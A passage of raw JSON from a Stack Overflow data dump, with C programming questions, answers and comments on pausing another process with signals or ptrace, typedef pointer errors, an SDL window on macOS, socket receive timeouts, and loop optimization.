process. Then you can examine and modify variables, stop the process, force it to call specific functions, etc.</p>\n\n<p>Debuggers make use of the <code>ptrace</code> mechanism that was mentioned in comments. This way, you don't need to learn all the details of converting information in the program's symbol table to the actual controlling code, this has all been done by the debugger's author.</p>\n\n<p>You'll need a copy of the program with the symbol table intact for this.</p>\n\n<p>If you just want to suspend the program and resume it, you can do it from the shell:</p>\n\n<pre><code>kill -STOP &lt;pid&gt;\nkill -CONT &lt;pid&gt;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461780002, "post_id": 36896947, "comment_id": 61359086, "body": "I just want to control the execution of program2 without making any changes in program2. May be sometime program2 will run, sometime it will pause. I was reading about cpulimit , but no idea if it will help to achieve that. Although cpulimit is not related to signal/interrupt."}, {"owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": "https://stackoverflow.com/users/6192747/stian-skjelstad"}, "reply_to_user": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461780339, "post_id": 36896947, "comment_id": 61359291, "body": "you can also use the ptrace API, this allows you to intercept signal receive, making SIGSTOP/SIGCONT invisible, pause at any system call etc."}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461781035, "post_id": 36896947, "comment_id": 61359722, "body": "does ptrace API needs to include inside Program1 ? If it needs to include Program2 , I can&#39;t use that approach. However, I know the pid of Program2. Can I use pid of Program2 inside Program1 using ptrace you are talking about? If yes, a link to related document or a sample code will be a great help."}], "tags": [], "owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": "https://stackoverflow.com/users/6192747/stian-skjelstad"}, "is_accepted": false, "score": 0, "last_activity_date": 1461778383, "creation_date": 1461778383, "answer_id": 36896947, "question_id": 36894504, "link": "https://stackoverflow.com/questions/36894504/sending-interrupt-signal-to-other-independent-process-in-c-c-in-linux/36896947#36896947", "title": "Sending interrupt signal to other independent process in C/C++ in linux", "body": "<p>If you want to pause program2, you can use kill/signal SIGCONT SIGSTOP SIGTSTP.</p>\n\n<p>Since you can not change anything in program2, how would you expect program2 to be able to receive and IPC/remote signals?</p>\n"}], "owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 465, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1461784743, "creation_date": 1461771467, "last_edit_date": 1461780880, "question_id": 36894504, "link": "https://stackoverflow.com/questions/36894504/sending-interrupt-signal-to-other-independent-process-in-c-c-in-linux", "title": "Sending interrupt signal to other independent process in C/C++ in linux", "body": "<p>I have two programs in C/C++. Program1 has multiple thread (under my control, I can add any code inside this program) and Program2 has one thread(not under my control, so can't add any code). Both programs are running on different CPU core. </p>\n\n<p>Threads in Program1 are running in round-robin fashion.</p>\n\n<p>Is there any way I can control execution of other program2 from program1 by sending any signal or interrupt from thread of Program1? </p>\n\n<p>Is it possible to control execution in the following way ?</p>\n\n<pre><code>Step 1 : Thread (i) sends interrupt/notification to start execution of Program2\nStep 2 : Program2 start execution\nStep 3 : Thread (i+1) sends notification/interrupt to stop execution of Program2 or preempted/scheduled out this process from CPU core.\n\n\nCore -1 : ---T1----Signal sent to V to start --T2---Signal sent to V to stop--\n\n\nCore -2 : ---------------- V start here -----------------V stop here------\n</code></pre>\n\n<p>When both Program1 and Program2 are running in same CPU core, I am able to control execution of program2.</p>\n\n<pre><code>Core 1 : ----T1----V ----- T2 ----- V -----\n</code></pre>\n\n<p>Now, I want to implement this in a scenario when two independent processes are running in separate CPU core.   </p>\n\n<p>I am using gcc/g++ and linux.</p>\n\n<p>Any link to related document/concept or suggestions to implement above idea will be a great help. Thanks in advance.</p>\n\n<p><strong>Update 1:</strong> We <strong>can't write signal handler code</strong> inside Program2. As it is independent program. We can write anything inside Program1.</p>\n\n<p><strong>Update 2:</strong> From several comments received so far, it looks like we need to write a signal handler in Program2 to control execution of program2 by using sending signal/interrupt. It is not necessary to send signal/interrupt to control execution (start/pause) of Program2, we can think other way to restrict to run program2, may be by <strong>using cpulimit</strong> or some other way which I don't know.</p>\n\n<pre><code>Core -1 : ---T1----Something needs to be done here to start V --T2---Something needs to be done here to stop V--\n\n\nCore -2 : ---------------- V start here --------------------------------V stop here------\n</code></pre>\n"}, {"tags": ["c", "pointers", "struct", "gcc-warning"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1461771517, "post_id": 36894472, "comment_id": 61353138, "body": "Start with removing the <code>typedef</code>ing pointers. They are just harmful by obfuscating your code, hiding the semantics and eventually result in confusion - QED."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1461771584, "post_id": 36894472, "comment_id": 61353198, "body": "And <code>typedef</code>s are actually aliases. C is not typed by name, but by compatible/&quot;real&quot; type."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461771706, "post_id": 36894472, "comment_id": 61353305, "body": "<code>typedef struct StackNode</code> typo as <code>typedef struct stackNode</code> (S and s)"}], "answers": [{"comments": [{"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1461773962, "post_id": 36894626, "comment_id": 61355090, "body": "<i>But better solution is to not hide pointers behind typedef at all</i> Unless you are Microsoft. Then you can do that willy-nilly. Sorry, couldn&#39;t resist :) :)"}, {"owner": {"reputation": 1250, "user_id": 732407, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/8998278b580b3e3863141b864647e503?s=128&d=identicon&r=PG", "display_name": "puggsoy", "link": "https://stackoverflow.com/users/732407/puggsoy"}, "edited": false, "score": 0, "creation_date": 1461810531, "post_id": 36894626, "comment_id": 61372108, "body": "The reason I&#39;m using typedefs is because I&#39;m doing an assignment and we&#39;re given these typedefs that we need to use. This is probably to make sure we understand how to use them, rather than to show us good practice. Thanks for pointing that out though, I will be sure to reduce hiding pointers since I can see how it would be harmful. Anyway your solution worked, indeed looking back I now see that the pointer type definition they gave us didn&#39;t actually have the struct keyword and for some reason I wrote it anyway. Thanks!"}], "tags": [], "owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "is_accepted": true, "score": 3, "last_activity_date": 1461772796, "last_edit_date": 1461772796, "creation_date": 1461771767, "answer_id": 36894626, "question_id": 36894472, "link": "https://stackoverflow.com/questions/36894472/cant-assign-address-of-struct-to-a-variable-whose-type-is-a-typedef-of-pointer/36894626#36894626", "title": "Can&#39;t assign address of struct to a variable whose type is a typedef of pointer to that struct", "body": "<p>Problem is this type definition:</p>\n\n<pre><code>typedef struct StackNode *StackNodePtr;\n</code></pre>\n\n<p>There is no <code>struct StackNode</code>. Only <code>struct stackNode</code> and <code>StackNode</code> exist. So you'll need to use either one of those in the typedef.</p>\n\n<p>But better solution is to not hide pointers behind typedef at all:</p>\n\n<ol>\n<li>It makes the pointer more clearly visible.</li>\n<li>It works better with type qualifiers, such as <code>const</code> and <code>volatile</code>.  If you define <code>StackNodePtr</code>, you may have to define <code>ConstStackNodePtr</code>, <code>VolatileStackNodePtr</code> and <code>ConstVolatileStackNodePtr</code> also.</li>\n</ol>\n\n<p>So, get rid of <code>StackNodePtr</code> and simply use the method you already tried:</p>\n\n<pre><code>StackNode *stackPtr = &amp;stack;  // stackPtr is clearly a pointer\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5916, "user_id": 3068258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7ecfa82e529a576cbc6ef661b9c9815?s=128&d=identicon&r=PG", "display_name": "Andy Schweig", "link": "https://stackoverflow.com/users/3068258/andy-schweig"}, "is_accepted": false, "score": 0, "last_activity_date": 1461771904, "creation_date": 1461771904, "answer_id": 36894686, "question_id": 36894472, "link": "https://stackoverflow.com/questions/36894472/cant-assign-address-of-struct-to-a-variable-whose-type-is-a-typedef-of-pointer/36894686#36894686", "title": "Can&#39;t assign address of struct to a variable whose type is a typedef of pointer to that struct", "body": "<p>\"stackNode\" is misspelled in</p>\n\n<pre><code>typedef struct StackNode *StackNodePtr;\n</code></pre>\n\n<p>(capital \"S\").</p>\n"}], "owner": {"reputation": 1250, "user_id": 732407, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/8998278b580b3e3863141b864647e503?s=128&d=identicon&r=PG", "display_name": "puggsoy", "link": "https://stackoverflow.com/users/732407/puggsoy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 136, "favorite_count": 0, "accepted_answer_id": 36894626, "answer_count": 2, "score": 0, "last_activity_date": 1461772796, "creation_date": 1461771391, "question_id": 36894472, "link": "https://stackoverflow.com/questions/36894472/cant-assign-address-of-struct-to-a-variable-whose-type-is-a-typedef-of-pointer", "title": "Can&#39;t assign address of struct to a variable whose type is a typedef of pointer to that struct", "body": "<p>I'm somewhat new to C, I'm learning it at uni, and I think I might be misunderstanding something about typedefs. Here's my code:</p>\n\n<pre><code>struct stackNode\n{\n    char data;\n    struct stackNode *nextPtr;\n};\ntypedef struct stackNode StackNode;\ntypedef struct StackNode *StackNodePtr;\n\nint main()\n{\n    StackNode stack;\n    StackNodePtr stackPtr = &amp;stack;\n}\n</code></pre>\n\n<p>This gives me this warning:</p>\n\n<pre><code>warning: initialization from incompatible pointer type [enabled by default]\n     StackNodePtr stackPtr = &amp;stack;\n                             ^\n</code></pre>\n\n<p>However if I replace that line with this:</p>\n\n<pre><code>StackNode *stackPtr = &amp;stack;\n</code></pre>\n\n<p>It works fine.</p>\n\n<p>Unfortunately I'm not seeing the real difference here. Isn't <code>typedef struct StackNode *StackNodePtr;</code> just a sort of \"wrapper type\" for a pointer to the Stack struct? I've got a pretty good grasp of pointers and structs, but I don't know what's going on here. I'm sure I'm just missing something small.</p>\n\n<p>By the way, I'm compiling in c89 mode using gcc.</p>\n"}, {"tags": ["c", "xcode", "macos"], "comments": [{"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1461771130, "post_id": 36894192, "comment_id": 61352883, "body": "You didn&#39;t test if the window is effectively created."}, {"owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "edited": false, "score": 0, "creation_date": 1461771144, "post_id": 36894192, "comment_id": 61352893, "body": "Check the errors. Especially if <code>pWindow</code> is <code>NULL</code>. You can print a human readable error message with <code>SDL_GetError()</code>."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1461771648, "post_id": 36894192, "comment_id": 61353258, "body": "<a href=\"http://lazyfoo.net/tutorials/SDL/01_hello_SDL/index2.php\" rel=\"nofollow noreferrer\">This guide</a> suggest you must add some other functions to your code to get the windows displayed."}, {"owner": {"reputation": 1081, "user_id": 5718447, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c3ed310afd31cfb3a5bdcfd8c039da33?s=128&d=identicon&r=PG&f=1", "display_name": "eloiletagant", "link": "https://stackoverflow.com/users/5718447/eloiletagant"}, "edited": false, "score": 0, "creation_date": 1461785731, "post_id": 36894192, "comment_id": 61362720, "body": "Thank you very much ! I don&#39;t know what was the problem but with the code of your guide it works perfectly"}], "owner": {"reputation": 1081, "user_id": 5718447, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c3ed310afd31cfb3a5bdcfd8c039da33?s=128&d=identicon&r=PG&f=1", "display_name": "eloiletagant", "link": "https://stackoverflow.com/users/5718447/eloiletagant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 827, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1461770665, "creation_date": 1461770665, "question_id": 36894192, "link": "https://stackoverflow.com/questions/36894192/window-doesnt-appear-in-c-program-with-sdl-on-mac-os-x-xcode", "title": "Window doesn&#39;t appear in C program with SDL on mac OS X (Xcode)", "body": "<p>i am a beginner in C and i want to make a window with the framework SDL in Xcode ;\ni read a lot of things about that but i don't resolve my issue :\ni can build and run, i don't have any problems of compilation (the SDL files are well imported and linked),\nbut no matter the code i'm using, the windows doesn't appear..\nfor exemple this one :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;SDL2/SDL.h&gt;\n\nint main(int argc, char** argv) {\n\nSDL_Init(SDL_INIT_VIDEO);\n\nSDL_Window* pWindow = NULL;\npWindow = SDL_CreateWindow(\"Ma fenetre a moi\",\n        SDL_WINDOWPOS_UNDEFINED,\n        SDL_WINDOWPOS_UNDEFINED,\n        640,\n        480,\n        SDL_WINDOW_SHOWN);\n\nSDL_Delay(3000);\n\n// SDL_DestroyWindow(pWindow);\nSDL_Quit();\n\nreturn (EXIT_SUCCESS);\n}\n</code></pre>\n\n<p>I'm on OS X 11.4 and Xcode 7.3</p>\n\n<p>Hoping someone know this issue, thank you to help me !</p>\n"}, {"tags": ["c", "sockets"], "comments": [{"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461770828, "post_id": 36893807, "comment_id": 61352645, "body": "You <code>setsockopt</code> call seems alright to me, and it works for me. What behavior are you seeing and how does it differ from what you expect? I do notice that you don&#39;t check the return value from <code>recv()</code>, and that does make me wonder what you expect would happen if it times out."}, {"owner": {"reputation": 669, "user_id": 4253349, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a19ee1470c911dba5798cf5c0a0d4cc9?s=128&d=identicon&r=PG&f=1", "display_name": "lllook", "link": "https://stackoverflow.com/users/4253349/lllook"}, "reply_to_user": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461771494, "post_id": 36893807, "comment_id": 61353116, "body": "I want to close connection if it timeouts"}], "answers": [{"comments": [{"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 1, "creation_date": 1461770953, "post_id": 36894060, "comment_id": 61352749, "body": "poll is much better than select."}, {"owner": {"reputation": 669, "user_id": 4253349, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a19ee1470c911dba5798cf5c0a0d4cc9?s=128&d=identicon&r=PG&f=1", "display_name": "lllook", "link": "https://stackoverflow.com/users/4253349/lllook"}, "edited": false, "score": 0, "creation_date": 1461770994, "post_id": 36894060, "comment_id": 61352786, "body": "Thank you! I know about select() method, I succesfully used that, my intention was to learn how to use setsockopt for timeouts"}, {"owner": {"reputation": 669, "user_id": 4253349, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a19ee1470c911dba5798cf5c0a0d4cc9?s=128&d=identicon&r=PG&f=1", "display_name": "lllook", "link": "https://stackoverflow.com/users/4253349/lllook"}, "edited": false, "score": 0, "creation_date": 1461771415, "post_id": 36894060, "comment_id": 61353072, "body": "One more question, does above code really reset timeout after i received at least something ?"}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1461772012, "post_id": 36894060, "comment_id": 61353543, "body": "@SergeyA <code>poll</code> maybe better, but is part of winsock"}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "reply_to_user": {"reputation": 669, "user_id": 4253349, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a19ee1470c911dba5798cf5c0a0d4cc9?s=128&d=identicon&r=PG&f=1", "display_name": "lllook", "link": "https://stackoverflow.com/users/4253349/lllook"}, "edited": false, "score": 0, "creation_date": 1461772033, "post_id": 36894060, "comment_id": 61353563, "body": "@lllook: I think so, but I not tested it."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1461772380, "post_id": 36894060, "comment_id": 61353828, "body": "@purplepsycho, where does the question mention winsock?"}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1461772995, "post_id": 36894060, "comment_id": 61354338, "body": "@SergeyA Sorry, I forgot some words in my previous comment. I mean, <code>select</code> is available on windows, *nix... while <code>poll</code> is only available on *nix"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 1, "creation_date": 1461799835, "post_id": 36894060, "comment_id": 61369345, "body": "@purplepsycho: Windows has <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms741669.aspx\" rel=\"nofollow noreferrer\"><code>WSAPoll()</code></a> (see <a href=\"https://blogs.msdn.microsoft.com/wndp/2006/10/26/wsapoll-a-new-winsock-api-to-simplify-porting-poll-applications-to-winsock/\" rel=\"nofollow noreferrer\">WSAPoll, A new Winsock API to simplify porting poll() applications to Winsock</a>), though it is <a href=\"https://daniel.haxx.se/blog/2012/10/10/wsapoll-is-broken/\" rel=\"nofollow noreferrer\">known to be broken</a> :("}], "tags": [], "owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "is_accepted": true, "score": 4, "last_activity_date": 1461799796, "last_edit_date": 1461799796, "creation_date": 1461770338, "answer_id": 36894060, "question_id": 36893807, "link": "https://stackoverflow.com/questions/36893807/setting-timeout-for-socket-recv-tcp/36894060#36894060", "title": "setting timeout for socket recv TCP", "body": "<p>You should test the return of <code>recv</code> and <code>break</code> your loop if it is <code>EAGAIN</code> or <code>EWOULDBLOCK</code>:</p>\n\n<blockquote>\n  <p>EAGAIN or EWOULDBLOCK<br>\n  The socket is marked nonblocking and the receive operation would block, or a receive timeout had been set and the timeout expired before data was received</p>\n</blockquote>\n\n<pre><code>struct timeval tv = {5, 0};\nsetsockopt(cli_socket, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&amp;tv, sizeof(struct timeval));\n\nwhile((cut = buffer.find(\"\\r\\n\")) == -1)\n{\n    int numBytes = recv(cli_socket, tmpBuffer, 100, 0));\n\n    /// Edit: recv does not return EAGAIN else, it return -1 on error.\n    /// and in case of timeout, errno is set to EAGAIN or EWOULDBLOCK\n\n    if (numBytes &lt;= 0)\n    {\n        // nothing received from client in last 5 seconds\n        break;\n    }\n\n    buffer.append(tmpBuffer, numBytes);\n}\n</code></pre>\n\n<p>You can also use <code>select</code> function which is not so complicated to use:</p>\n\n<pre><code>while((cut = buffer.find(\"\\r\\n\")) == -1)\n{\n    timeval timeout = { 5, 0 };\n    fd_set in_set;\n\n    FD_ZERO(&amp;in_set);\n    FD_SET(cli_socket, &amp;in_set);\n\n    // select the set\n    int cnt = select(cli_socket + 1, &amp;in_set, NULL, NULL, &amp;timeout);\n\n    if (FD_ISSET(cli_socket, &amp;in_set))\n    {\n        int numBytes = recv(cli_socket, tmpBuffer, 100, 0));\n        if (numBytes &lt;= 0)\n        {\n            // nothing received from client\n            break;\n        }\n\n        buffer.append(tmpBuffer, numBytes);\n    }\n    else\n    {\n        // nothing received from client in last 5 seconds\n        break;       \n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 669, "user_id": 4253349, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a19ee1470c911dba5798cf5c0a0d4cc9?s=128&d=identicon&r=PG&f=1", "display_name": "lllook", "link": "https://stackoverflow.com/users/4253349/lllook"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 12332, "favorite_count": 0, "accepted_answer_id": 36894060, "answer_count": 1, "score": 1, "last_activity_date": 1461799796, "creation_date": 1461769725, "question_id": 36893807, "link": "https://stackoverflow.com/questions/36893807/setting-timeout-for-socket-recv-tcp", "title": "setting timeout for socket recv TCP", "body": "<p>I found some hints on how to do it but I dont understand how to use setsockopt. I have an infinite while loop calling recv, I want to timeout and <code>close(cli_socket)</code> if client doesnt send anything in 5 seconds.</p>\n\n<p>If client sends only part of the whole expected message I want to reset timer and give him another 5 seconds.</p>\n\n<p>currentry I have this:</p>\n\n<pre><code>while((cut = buffer.find(\"\\r\\n\")) == -1)\n        {\n            struct timeval tv;\n            tv.tv_sec = 5;\n            setsockopt(cli_socket, SOL_SOCKET, SO_RCVTIMEO,(struct timeval *)&amp;tv,sizeof(struct timeval));\n            recv(cli_socket, tmpBuffer, 100, 0);\n            buffer += tmpBuffer;\n            memset(tmpBuffer, 0, 100);\n        }\n</code></pre>\n"}, {"tags": ["c", "performance", "gcc", "optimization", "oprofile"], "comments": [{"owner": {"reputation": 55059, "user_id": 212858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1166c87b6f3fc2e6746da96b60fefb46?s=128&d=identicon&r=PG", "display_name": "Useless", "link": "https://stackoverflow.com/users/212858/useless"}, "edited": false, "score": 5, "creation_date": 1461769721, "post_id": 36893556, "comment_id": 61351771, "body": "If the <code>ddQ</code> line really takes 45% of your time, just commenting it out should give you a massive speedup. Does it?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1461770075, "post_id": 36893556, "comment_id": 61352047, "body": "The vectorizer&#39;s output probably relates to the <code>offset</code> component in the definition of macro <code>_table_derive</code>.  If there is a small enough upper bound on the size needed for this array, then it might make sense to use an ordinary local array (of <code>double</code>s), or maybe a local VLA.  Otherwise, if you can take out the offset, so that <code>_table_derive</code> starts at the beginning of <code>Buffer_temp</code>, then that should also resolve any uncertainty about alignment."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1461770455, "post_id": 36893556, "comment_id": 61352380, "body": "Overall, the whole <code>Buffer_temp</code> / offset / casting thing has bad code smell.  In fact, most casting has bad code smell all by itself.  Making it as easy as possible for the compiler to understand what&#39;s going on in your code tends to improve the compiler&#39;s ability to optimize."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461771045, "post_id": 36893556, "comment_id": 61352817, "body": "<code>for(k=0; k&lt; 100; k++ ) { ... }</code> could be re-written to <code>x = foo(); for(k=100; --k; ) { ddI +=_table_derive[x]; ddQ +=_table_derive[x+1]; x += _interval_derive_dIdQ}</code> or something like that."}, {"owner": {"reputation": 40893, "user_id": 1386054, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/424ZW.jpg?s=128&g=1", "display_name": "Adrian McCarthy", "link": "https://stackoverflow.com/users/1386054/adrian-mccarthy"}, "edited": false, "score": 0, "creation_date": 1461782164, "post_id": 36893556, "comment_id": 61360458, "body": "The access pattern to <code>_table_derived</code> isn&#39;t very cache friendly?  Is it a giant table that&#39;s being paged-in on demand?  Even if it&#39;s all in memory, you&#39;re likely suffering lots of cache misses.  The omitted code may be more cache friendly and thus is relatively fast.  Is the overall code actually slow?  Or is it just that the optimizer is pointing to the inner loop and saying most of the time spent is here?"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1461796053, "post_id": 36893556, "comment_id": 61368153, "body": "If this can auto-vectorize, try <code>aligned(16)</code> or 32.  (And allocate with <code>aligned_alloc</code>)"}, {"owner": {"reputation": 2077, "user_id": 1071669, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/701fc95be1eaf05adaccd367ba33ec9b?s=128&d=identicon&r=PG", "display_name": "dargaud", "link": "https://stackoverflow.com/users/1071669/dargaud"}, "edited": false, "score": 0, "creation_date": 1461852659, "post_id": 36893556, "comment_id": 61396369, "body": "Thanks. See my additions on the original post."}, {"owner": {"reputation": 38606, "user_id": 23771, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/NeuGc.jpg?s=128&g=1", "display_name": "Mike Dunlavey", "link": 